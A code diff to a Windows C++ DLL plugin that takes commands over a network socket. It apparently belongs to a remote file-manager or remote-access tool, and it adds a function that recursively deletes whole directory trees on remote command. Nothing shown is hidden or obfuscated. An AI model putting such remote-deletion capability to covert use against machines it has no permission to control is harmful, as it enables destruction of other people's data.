@@ -204,6 +204,25 @@ static void send_log(SOCKET sock, const string& message) {
     send_json(sock, log);
 }
 
+static BOOL DeleteRecursiveW(const wstring& path) {
+    WIN32_FIND_DATAW findData;
+    wstring searchPath = path + L"\\*";
+    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
+    if (hFind == INVALID_HANDLE_VALUE) return FALSE;
+
+    do {
+        if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0) continue;
+        wstring fullPath = path + L"\\" + findData.cFileName;
+        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+            DeleteRecursiveW(fullPath);
+        } else {
+            DeleteFileW(fullPath.c_str());
+        }
+    } while (FindNextFileW(hFind, &findData));
+    FindClose(hFind);
+    return RemoveDirectoryW(path.c_str());
+}
+
 extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
     send_drives(sock);
 }
@@ -223,7 +242,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* com
             DWORD attr = GetFileAttributesW(path.c_str());
             BOOL success = FALSE;
             if (attr != INVALID_FILE_ATTRIBUTES) {
-                if (attr & FILE_ATTRIBUTE_DIRECTORY) success = RemoveDirectoryW(path.c_str());
+                if (attr & FILE_ATTRIBUTE_DIRECTORY) success = DeleteRecursiveW(path);
                 else success = DeleteFileW(path.c_str());
             }
             if (success) {
